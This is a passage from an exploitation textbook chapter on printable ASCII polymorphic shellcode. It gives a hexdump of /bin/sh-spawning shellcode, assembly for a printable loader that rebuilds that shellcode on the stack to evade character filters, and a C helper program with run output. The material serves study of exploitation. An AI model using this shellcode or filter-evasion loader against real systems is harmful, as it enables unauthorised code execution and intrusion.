<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x691 Polymorphic Printable ASCII Shellcode</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part151.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part153.htm">Next &gt;</a></p><p class="s32" style="padding-top: 4pt;padding-left: 91pt;text-indent: 0pt;text-align: left;"><a name="bookmark139">0x691 Polymorphic Printable ASCII Shellcode</a></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Polymorphic shellcode refers to any shellcode that changes itself. The encod- ing shellcode from the previous section is technically polymorphic, since it modifies the string it uses while it’s running. The new NOP sled uses instruc- tions that assemble into printable ASCII bytes. There are other instructions that fall into this printable range (from <span class="s31">0x33 </span>to <span class="s31">0x7e</span>); however, the total set is actually rather small.</p><p style="padding-left: 91pt;text-indent: 17pt;text-align: left;">The goal is to write shellcode that will get past the printable character check. Trying to write complex shellcode with such a limited instruction set would simply be masochistic, so instead, the printable shellcode will use simple methods to build more complex shellcode on the stack. In this way, the print- able shellcode will actually be instructions to make the real shellcode.</p><p style="padding-left: 91pt;text-indent: 18pt;text-align: left;">The first step is figuring out a way to zero out registers. Unfortunately, the XOR instruction on the various registers doesn’t assemble into the printable ASCII character range. One option is to use the AND bitwise operation, which assembles into the percent character (<span class="s31">%</span>) when using the EAX register. The assembly instruction of <span class="s31">and eax, 0x41414141 </span>will assemble to the printable machine code of <span class="s31">%AAAA</span>, since <span class="s31">0x41 </span>in hexadecimal is the printable character <span class="s27">A</span>.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 11pt;text-align: left;">An AND operation transforms bits as follows:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1117.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 and 1 = 1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">0 and 0 = 0</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">1 and 0 = 0</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">0 and 1 = 0</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1118.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;text-align: left;">Since the only case where the result is 1 is when both bits are 1, if two inverse values are ANDed onto EAX, EAX will become zero.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1119.png"/></span></p><p class="s46" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Binary                Hexadecimal</p><p class="s31" style="padding-left: 91pt;text-indent: 17pt;text-align: left;">1000101010011100100111101001010   0x454e4f4a AND 0111010001100010011000000110101  AND 0x3a313035</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s97" style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="203" height="1" alt="image" src="Image_1120.png"/></span> <span><img width="85" height="1" alt="image" src="Image_1121.png"/></span></p><p class="s31" style="padding-top: 3pt;padding-bottom: 3pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">0000000000000000000000000000000   0x00000000</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1122.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;text-align: justify;">Thus, by using two printable 32-bit values that are bitwise inverses of each other, the EAX register can be zeroed without using any null bytes, and the resulting assembled machine code will be printable text.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1123.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">and eax, 0x454e4f4a ; Assembles into %JONE and eax, 0x3a313035 ; Assembles into %501:</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1124.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;text-align: justify;">So <span class="s31">%JONE%501: </span>in machine code will zero out the EAX register. Interesting. Some other instructions that assemble into printable ASCII characters are shown in the box below.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1125.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">sub eax, 0x41414141  -AAAA push eax       P</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">pop eax        X</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push esp       T</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">pop esp        \</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1126.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;text-align: left;">Amazingly, these instructions, combined with the <span class="s31">AND eax </span>instruction, are sufficient to build loader code that will inject the shellcode onto the stack and then execute it. The general technique is, first, to set ESP back behind the executing loader code (in higher memory addresses), and then to build the shellcode from end to start by pushing values onto the stack, as shown here.</p><p style="padding-left: 91pt;text-indent: 17pt;text-align: left;">Since the stack grows up (from higher memory addresses to lower memory addresses), the ESP will move backward as values are pushed to the stack, and the EIP will move forward as the loader code executes. Eventually, EIP and ESP will meet up, and the EIP will continue executing into the freshly built shellcode.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s79" style="padding-top: 5pt;padding-left: 92pt;text-indent: 0pt;text-align: left;">1)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s69" style="padding-top: 4pt;padding-left: 11pt;text-indent: 0pt;text-align: left;">Loader Code</p><p style="padding-left: 102pt;text-indent: 0pt;text-align: left;"/><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="8" height="21" alt="image" src="Image_1127.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="8" height="21" alt="image" src="Image_1128.png"/></span></p><p class="s69" style="padding-top: 6pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">EIP                     ESP</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 92pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="255" height="1" alt="image" src="Image_1129.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s79" style="padding-left: 92pt;text-indent: 0pt;text-align: left;">2)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s69" style="padding-top: 4pt;padding-left: 11pt;text-indent: 0pt;text-align: left;">Loader Code</p><p class="s69" style="padding-top: 4pt;padding-left: 10pt;text-indent: 0pt;text-align: left;">Shellcode</p><p class="s57" style="padding-left: 102pt;text-indent: 0pt;text-align: left;">	</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="8" height="21" alt="image" src="Image_1130.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="8" height="21" alt="image" src="Image_1131.png"/></span></p><p class="s69" style="padding-top: 6pt;padding-left: 120pt;text-indent: 0pt;text-align: left;">EIP               ESP</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 92pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="255" height="1" alt="image" src="Image_1132.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s79" style="padding-left: 92pt;text-indent: 0pt;text-align: left;">3)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="241" height="48" alt="image" src="Image_1133.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s69" style="padding-left: 49pt;text-indent: 0pt;text-align: left;">EIP  ESP</p><p style="text-indent: 0pt;text-align: left;"/><p class="s69" style="padding-top: 4pt;padding-left: 24pt;text-indent: 0pt;text-align: left;">Shellcode being built</p><p style="text-indent: 0pt;text-align: left;"/><p class="s69" style="padding-top: 4pt;padding-left: 11pt;text-indent: 0pt;text-align: left;">Loader Code</p><p style="text-indent: 0pt;text-align: left;"/><p class="s98" style="padding-left: 125pt;text-indent: 0pt;line-height: 2pt;text-align: center;">o</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;text-align: left;">First, ESP must be set behind the printable loader shellcode. A little debugging with GDB shows that after gaining control of program execution, ESP is 555 bytes before the start of the overflow buffer (which will contain the loader code). The ESP register must be moved so it’s after the loader code, while still leaving room for the new shellcode and for the loader shellcode itself. About 300 bytes should be enough room for this, so let’s add 860 bytes to ESP to put it 305 bytes past the start of the loader code. This value doesn’t need to be exact, since provisions will be made later to allow for some slop. Since the only usable instruction is subtraction, addition can be simulated by subtracting so much from the register that it wraps around. The register only has 32 bits of space, so adding 860 to a register is the same as subtracting 860 from 2<span class="s41">32</span>, or 4,294,966,436. However, this subtraction must only use printable values, so we split it up across three instructions that all use printable operands.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1134.png"/></span></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">sub eax, 0x39393333 ; Assembles into -3399 sub eax, 0x72727550 ; Assembles into -Purr sub eax, 0x54545421 ; Assembles into -!TTT</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1135.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;text-align: left;">As the GDB output confirms, subtracting these three values from a 32-bit number is the same as adding 860 to it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1136.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ gdb -q</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) print 0 - 0x39393333 - 0x72727550 - 0x54545421</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">$1 = 860</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb)</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1137.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">The goal is to subtract these values from ESP, not EAX, but the instruction <span class="s31">sub esp </span>doesn’t assemble into a printable ASCII character. So the current value of ESP must be moved into EAX for the subtraction, and then the new value of EAX must be moved back into ESP.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">However, since neither <span class="s31">mov esp, eax </span>nor <span class="s31">mov eax, esp </span>assemble into printable ASCII characters, this exchange must be done using the stack. By pushing the value from the source register to the stack and then popping it off into the destination register, the equivalent of a <span class="s31">mov </span><span class="s33">dest, source </span>instruction can be accomplished with <span class="s31">push </span><span class="s33">source </span>and <span class="s31">pop </span><span class="s33">dest</span>. Fortunately, the <span class="s31">pop </span>and <span class="s31">push </span>instructions for both EAX and ESP registers assemble into printable ASCII characters, so this can all be done using printable ASCII.</p><p style="padding-left: 109pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Here is the final set of instructions to add 860 to ESP.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1138.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push esp      ; Assembles into T</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">pop eax       ; Assembles into X</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">sub eax, 0x39393333 ; Assembles into -3399 sub eax, 0x72727550 ; Assembles into -Purr sub eax, 0x54545421 ; Assembles into -!TTT</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">push eax      ; Assembles into P</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">pop esp       ; Assembles into \</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1139.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This means that <span class="s31">TX-3399-Purr-!TTT-P\ </span>will add 860 to ESP in machine code. So far, so good. Now the shellcode must be built.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">First, EAX must be zeroed out; this is easy now that a method has been discovered. Then, by using more <span class="s31">sub </span>instructions, the EAX register must be set to the last four bytes of the shellcode, in reverse order. Since the stack normally grows upward (toward lower memory addresses) and builds with a FILO ordering, the first value pushed to the stack must be the last four bytes of the shellcode. These bytes must be in reverse order, due to the little-endian byte ordering. The following output shows a hexadecimal dump of the stan- dard shellcode used in the previous chapters, which will be built by the print- able loader code.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1140.png"/></span></p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C ./shellcode.bin</p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:10pt"><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">00000000</p></td><td style="width:107pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">31 c0 31 db 31 c9 99 b0</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">a4 cd 80 6a 0b 58 51 68</p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|1.1.1.  j.XQh|</p></td></tr><tr style="height:11pt"><td style="width:38pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">00000010</p></td><td style="width:107pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">2f 2f 73 68 68 2f 62 69</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">6e 89 e3 <i>51 89 e2 53 </i><b>89</b></p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">|//shh/bin..Q..S.|</p></td></tr><tr style="height:14pt"><td style="width:38pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">00000020</p></td><td style="width:107pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s45" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">e1 cd 80</p></td><td style="width:106pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:154pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|...|</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">In this case, the last four bytes are shown in bold; the proper value for the EAX register is <span class="s31">0x80cde189</span>. This is easy to do by using <span class="s31">sub </span>instructions to wrap the value around. Then, EAX can be pushed to the stack. This moves</p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">ESP up (toward lower memory addresses) to the end of the newly pushed value, ready for the next four bytes of shellcode (shown in italic in the pre- ceding shellcode). More <span class="s31">sub </span>instructions are used to wrap EAX around to <span class="s31">0x53e28951, </span>and this value is then pushed to the stack. As this process is repeated for each four-byte chunk, the shellcode is built from end to start, toward the executing loader code.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:12pt"><td style="width:145pt;border-top-style:solid;border-top-width:1pt"><p class="s42" style="padding-top: 1pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000000 <i>31 c0 31 </i><b>db 31 c9 99 </b>b0</p></td><td style="width:106pt;border-top-style:solid;border-top-width:1pt"><p class="s42" style="padding-top: 1pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">a4 cd 80 6a 0b 58 51 68</p></td><td style="width:154pt;border-top-style:solid;border-top-width:1pt"><p class="s42" style="padding-top: 1pt;padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|1.1.1.  j.XQh|</p></td></tr><tr style="height:11pt"><td style="width:145pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">00000010 2f 2f 73 68 68 2f 62 69</p></td><td style="width:106pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">6e 89 e3 <i>51 89 e2 53 </i><b>89</b></p></td><td style="width:154pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|//shh/bin..Q..S.|</p></td></tr><tr style="height:14pt"><td style="width:145pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">00000020 <b>e1 cd 80</b></p></td><td style="width:106pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:154pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 10pt;text-align: left;">|...|</p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">printable_helper.c</p><p style="padding-top: 4pt;text-indent: 17pt;line-height: 108%;text-align: left;">Eventually, the beginning of the shellcode is reached, but there are only three bytes (shown in italic in the preceding shellcode) left after pushing <span class="s31">0x99c931db </span>to the stack. This situation is alleviated by inserting one single- byte NOP instruction at the beginning of the code, resulting in the value <span class="s31">0x31c03190 </span>being pushed to the stack—<span class="s31">0x90 </span>is machine code for NOP.</p><p style="text-indent: 17pt;line-height: 108%;text-align: left;">Each of these four-byte chunks of the original shellcode is generated with the printable subtraction method used earlier. The following source code is a program to help calculate the necessary printable values.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1141.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;sys/stat.h&gt; #include &lt;ctype.h&gt; #include &lt;time.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;</p><p class="s31" style="padding-top: 1pt;padding-left: 19pt;text-indent: 0pt;line-height: 21pt;text-align: left;">#define CHR &quot;%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-&quot; int main(int argc, char* argv[])</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 8pt;text-align: left;">{</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">unsigned int targ, last, t[4], l[4]; unsigned int try, single, carry=0; int len, a, i, j, k, m, z, flag=0; char word[3][4];</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 10pt;text-align: left;">unsigned char mem[70];</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">if(argc &lt; 2) {</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">printf(&quot;Usage: %s &lt;EAX starting value&gt; &lt;EAX end value&gt;\n&quot;, argv[0]); exit(1);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">}</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 106%;text-align: left;">srand(time(NULL)); bzero(mem, 70); strcpy(mem, CHR); len = strlen(mem);</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">strfry(mem); // Randomize</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">last = strtoul(argv[1], NULL, 0); targ = strtoul(argv[2], NULL, 0);</p><p class="s31" style="padding-top: 2pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">printf(&quot;calculating printable values to subtract from EAX..\n\n&quot;); t[3] = (targ &amp; 0xff000000)&gt;&gt;24; // Splitting by bytes</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">t[2] = (targ &amp; 0x00ff0000)&gt;&gt;16; t[1] = (targ &amp; 0x0000ff00)&gt;&gt;8; t[0] = (targ &amp; 0x000000ff); l[3] = (last &amp; 0xff000000)&gt;&gt;24; l[2] = (last &amp; 0x00ff0000)&gt;&gt;16; l[1] = (last &amp; 0x0000ff00)&gt;&gt;8; l[0] = (last &amp; 0x000000ff);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 44pt;text-indent: -12pt;line-height: 107%;text-align: left;">for(a=1; a &lt; 5; a++) { // Value count carry = flag = 0;</p><p class="s31" style="padding-left: 57pt;text-indent: -12pt;text-align: left;">for(z=0; z &lt; 4; z++) { // Byte count for(i=0; i &lt; len; i++) {</p><p class="s31" style="padding-left: 83pt;text-indent: -13pt;line-height: 107%;text-align: left;">for(j=0; j &lt; len; j++) { for(k=0; k &lt; len; k++) {</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">for(m=0; m &lt; len; m++)</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 107%;text-align: justify;">if(a &lt; 2) j = len+1; if(a &lt; 3) k = len+1; if(a &lt; 4) m = len+1;</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;line-height: 107%;text-align: left;">try = t[z] + carry+mem[i]+mem[j]+mem[k]+mem[m]; single = (try &amp; 0x000000ff);</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">if(single == l[z])</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">carry = (try &amp; 0x0000ff00)&gt;&gt;8; if(i &lt; len) word[0][z] = mem[i];</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">if(j &lt; len) word[1][z] = mem[j];</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">if(k &lt; len) word[2][z] = mem[k];</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;line-height: 107%;text-align: left;">if(m &lt; len) word[3][z] = mem[m]; i = j = k = m = len+2;</p><p class="s31" style="padding-left: 121pt;text-indent: 0pt;text-align: left;">flag++;</p><p class="s31" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 95pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 83pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 70pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-left: 57pt;text-indent: -12pt;line-height: 107%;text-align: left;">if(flag == 4) { // If all 4 bytes found printf(&quot;start: 0x%08x\n\n&quot;, last); for(i=0; i &lt; a; i++)</p><p style="text-indent: 0pt;text-align: left;"><span><img width="108" height="1" alt="image" src="Image_1142.png"/></span></p><p class="s31" style="padding-left: 57pt;text-indent: 12pt;line-height: 107%;text-align: left;">printf(&quot;   - 0x%08x\n&quot;, *((unsigned int *)word[i])); printf(&quot;         \n&quot;);</p><p class="s31" style="padding-left: 57pt;text-indent: 0pt;text-align: left;">printf(&quot;end:  0x%08x\n&quot;, targ);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 57pt;text-indent: 0pt;text-align: left;">exit(0);</p><p class="s31" style="padding-left: 44pt;text-indent: 0pt;text-align: left;">}</p><p class="s31" style="padding-bottom: 3pt;padding-left: 32pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1143.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">When this program is run, it expects two arguments—the start and the end values for EAX. For the printable loader shellcode, EAX is zeroed out to start with, and the end value should be <span class="s31">0x80cde189</span>. This value corresponds to the last four bytes from shellcode.bin.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1144.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ gcc -o printable_helper printable_helper.c reader@hacking:~/booksrc $ ./printable_helper 0 0x80cde189 calculating printable values to subtract from EAX..</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">start: 0x00000000</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 40pt;text-indent: 0pt;text-align: left;">- 0x346d6d25</p><p class="s31" style="padding-left: 40pt;text-indent: 0pt;text-align: left;">- 0x256d6d25</p><p class="s31" style="padding-left: 40pt;text-indent: 0pt;text-align: left;">- 0x2557442d</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="108" height="1" alt="image" src="Image_1145.png"/></span></p><p class="s31" style="padding-top: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">end:  0x80cde189</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C ./shellcode.bin</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 31 c0 31 db 31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 |1.1.1.   j.XQh|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 2f 2f 73 68 68 2f 62 69 6e 89 e3 51 89 e2 53 <b>89 </b>|//shh/bin..Q..S.|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020  <b>e1 cd 80                      </b>|. |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000023</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./printable_helper 0x80cde189 0x53e28951 calculating printable values to subtract from EAX..</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">start: 0x80cde189</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 40pt;text-indent: 0pt;text-align: left;">- 0x59316659</p><p class="s31" style="padding-left: 40pt;text-indent: 0pt;text-align: left;">- 0x59667766</p><p class="s31" style="padding-left: 40pt;text-indent: 0pt;text-align: left;">- 0x7a537a79</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="108" height="1" alt="image" src="Image_1146.png"/></span></p><p class="s31" style="padding-top: 4pt;padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">end:  0x53e28951 reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1147.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The output above shows the printable values needed to wrap the zeroed EAX register around to <span class="s31">0x80cde189 </span>(shown in bold). Next, EAX should be wrapped around again to <span class="s31">0x53e28951 </span>for the next four bytes of the shellcode (building backwards). This process is repeated until all the shellcode is built. The code for the entire process is shown below.</p><p 